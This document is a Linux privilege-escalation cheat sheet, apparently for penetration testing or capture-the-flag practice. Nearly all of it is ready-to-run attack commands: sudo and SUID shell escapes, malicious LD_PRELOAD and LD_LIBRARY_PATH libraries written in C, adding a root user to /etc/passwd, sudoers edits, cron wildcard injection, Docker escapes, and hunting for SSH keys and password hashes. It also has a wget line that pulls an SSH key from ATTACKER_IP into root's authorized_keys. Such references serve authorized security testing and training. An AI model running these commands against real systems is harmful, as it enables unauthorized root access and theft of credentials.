# Linux Privilege Escalation

## Linux-Enum


## System Information

```bash
# OS and kernel
uname -a
cat /etc/issue
cat /etc/*-release
cat /proc/version

# Hostname
hostname

# CPU architecture
lscpu

# Running processes
ps aux
top
```

## User & Group Information

```bash
# Current user
id
whoami

# All users
cat /etc/passwd
cat /etc/passwd | cut -d: -f1  # Just usernames

# Groups
cat /etc/group
groups

# Sudo rights
sudo -l

# Check if we're in docker/lxc group
id | grep -E "docker|lxc"

# Last logged in users
last
w

# User history
cat ~/.bash_history
cat ~/.zsh_history
```

## Network Information

```bash
# Network interfaces
ip a

# Routing table
ip route

# Active connections
ss -tulnp

# ARP table
ip neigh

# Firewall rules
iptables -L -n
cat /etc/iptables/rules.v4
```

## Installed Software & Services

```bash
# Installed packages (Debian/Ubuntu)
dpkg -l

# Installed packages (RedHat/CentOS)
rpm -qa

# Running services
systemctl list-units --type=service --state=running

# Enabled services
systemctl list-unit-files --state=enabled
```

## Automated Enumeration Tools

### LinPEAS
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Linux Exploit Suggester
```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### Pspy (Monitor processes without root)
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

## Sudo


## Check Sudo Rights

```bash
sudo -l

# Look for:
# - NOPASSWD entries
# - Specific binaries we can run
# - LD_PRELOAD or LD_LIBRARY_PATH
# - !root or !ALL (can be bypassed with sudo -u#-1)
```

## GTFOBins

Check https://gtfobins.github.io/ for sudo and SUID exploitation

## Common Exploitable Binaries

These apply to both `sudo` abuse and SUID binaries. Prefix with `sudo` when exploiting sudo rights; omit it for SUID binaries (append `-p` where relevant).

```bash
# vim/vi
sudo vim -c ':!/bin/sh'

# nano
sudo nano
# Then: Ctrl+R, Ctrl+X → reset; sh 1>&0 2>&0

# less
sudo less /etc/profile
!/bin/sh

# find
sudo find /etc -exec /bin/sh \;
# SUID variant:
find . -exec /bin/sh -p \; -quit

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# nmap (old versions)
echo "os.execute('/bin/sh')" > shell.nse
sudo nmap --script=shell.nse
# SUID variant: nmap --interactive → !sh

# perl
sudo perl -e 'exec "/bin/sh";'

# python
sudo python -c 'import os;os.system("/bin/sh")'

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# git
sudo git -p help config
!/bin/sh

# wget (write to files)
sudo wget http://ATTACKER_IP/authorized_keys -O /root/.ssh/authorized_keys

# bash (SUID only)
bash -p

# env (SUID only)
env /bin/sh -p

# cp (SUID — overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$1$hacker$HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak
cp /tmp/passwd.bak /etc/passwd

# php (SUID only)
php -r "pcntl_exec('/bin/sh', ['-p']);"

# systemctl (SUID only)
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

## LD_PRELOAD Exploitation

```bash
# If sudo -l shows: env_keep+=LD_PRELOAD

# Create malicious library
cat > shell.c <<EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c

# Execute with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so find
```

## Sudo Version < 1.8.28 (CVE-2019-14287)

```bash
# If sudo -l shows (ALL, !root)
sudo -u#-1 /bin/bash
```

## SUID-SGID


## Find SUID/SGID Binaries

```bash
# SUID
find / -perm -4000 -type f 2>/dev/null

# SGID
find / -perm -2000 -type f 2>/dev/null

# Both SUID and SGID
find / -perm -6000 -type f 2>/dev/null
```

## Custom SUID Binary Exploitation

```bash
# Check what the binary does
strings /path/to/suid_binary
ltrace /path/to/suid_binary
strace /path/to/suid_binary

# Look for:
# - System calls without full path
# - Libraries being loaded
# - Configuration files being read
```

## Capabilities


## Find Capabilities

```bash
getcap -r / 2>/dev/null

# Common capabilities:
# cap_setuid+ep - Can change UID
# cap_dac_read_search - Bypass file read permission checks
```

## Exploitable Capabilities

```bash
# python with cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl with cap_setuid+ep
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# php with cap_setuid+ep
/usr/bin/php -r "posix_setuid(0); system('/bin/bash');"

# tar with cap_dac_read_search - Read any file
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

## Cron-Jobs


## Enumerate Cron Jobs

```bash
# System-wide crontab
cat /etc/crontab

# User crontabs
crontab -l
ls -la /var/spool/cron/crontabs/

# Cron directories
ls -la /etc/cron.*
cat /etc/cron.d/*

# Systemd timers
systemctl list-timers --all
```

## Exploitation Techniques

```bash
# Writable cron script
echo '#!/bin/bash\nchmod +s /bin/bash' > /path/to/cron_script.sh

# Wildcard injection
# If cron runs: tar czf /backup.tar.gz *
echo '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

## Writable-Files


## Find Writable Files

```bash
# Find writable files (excluding noise)
find / -writable -type f 2>/dev/null | grep -v "/proc/" | grep -v "/sys/"

# World-writable files
find / -perm -002 -type f 2>/dev/null

# Check specific important files
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/crontab
```

## /etc/passwd Exploitation

```bash
# If /etc/passwd is writable

# Generate password hash
openssl passwd -1 -salt hacker hacker123

# Add new root user
echo 'hacker:$1$hacker$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su hacker
```

## /etc/sudoers Exploitation

```bash
# If /etc/sudoers is writable
echo "user ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo su
```

## Writable /etc/ld.so.preload

```bash
# If writable, add malicious library
# Create evil.so (same as LD_PRELOAD example above)
echo "/tmp/evil.so" > /etc/ld.so.preload

# Any SUID binary execution will load the library
```

## Kernel-Exploits


## Linux Kernel Exploits

```bash
# Check kernel version
uname -a
cat /proc/version

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# SearchSploit
searchsploit linux kernel $(uname -r)
```

## Common Kernel Exploits

```bash
# DirtyC0w (CVE-2016-5195) - Kernel 2.6.22 < 3.9 (x86/x64)
# Dirty Pipe (CVE-2022-0847) - Kernel 5.8 - 5.17
# PwnKit (CVE-2021-4034) - pkexec vulnerability
# Baron Samedit (CVE-2021-3156) - sudo vulnerability
```

## Docker-Escape


## Check if in Docker Container

```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep -i docker
mount | grep overlay
```

## Escape Techniques

```bash
# Docker socket — mount host filesystem
find / -name docker.sock 2>/dev/null
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Docker group (same command as above)
# User in docker group can run the docker command directly

# Privileged container — mount host block device
ip link add dummy0 type dummy  # succeeds if privileged
mkdir /tmp/hostOS
mount /dev/sda1 /tmp/hostOS
chroot /tmp/hostOS /bin/bash
```

## Password-Hunting


## Common Locations

```bash
# Configuration files
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null
find / -name "wp-config.php" -o -name "config.php" 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null

# History files
cat ~/.bash_history ~/.mysql_history ~/.nano_history ~/.viminfo

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
cat ~/.ssh/id_rsa ~/.ssh/authorized_keys

# Search for password strings
grep -ri "password" /home/ /var/www/ 2>/dev/null
grep -ri "pass=" /etc/ 2>/dev/null
```

## Memory & Process Dumps

```bash
ps aux | grep root
strings /proc/PID/maps | grep -i password
```

## PATH-Hijacking


## Check PATH

```bash
echo $PATH

# Look for writable directories in PATH
echo $PATH | tr ':' '\n' | while read dir; do ls -ld "$dir" 2>/dev/null; done
```

## PATH Hijacking Exploitation

```bash
# If script runs command without full path (e.g. "ls" instead of "/bin/ls")

# Create malicious binary
cat > /tmp/ls <<EOF
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/ls

# Modify PATH and run the vulnerable script
export PATH=/tmp:$PATH
./vulnerable_script.sh

# Execute SUID bash
/bin/bash -p
```

## Shared Library Hijacking

```bash
# Check if LD_LIBRARY_PATH is in sudo env_keep
sudo -l

# Create malicious library
cat > /tmp/evil.c <<EOF
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -o /tmp/evil.so -shared -fPIC /tmp/evil.c

# Execute with LD_LIBRARY_PATH
sudo LD_LIBRARY_PATH=/tmp BINARY
```
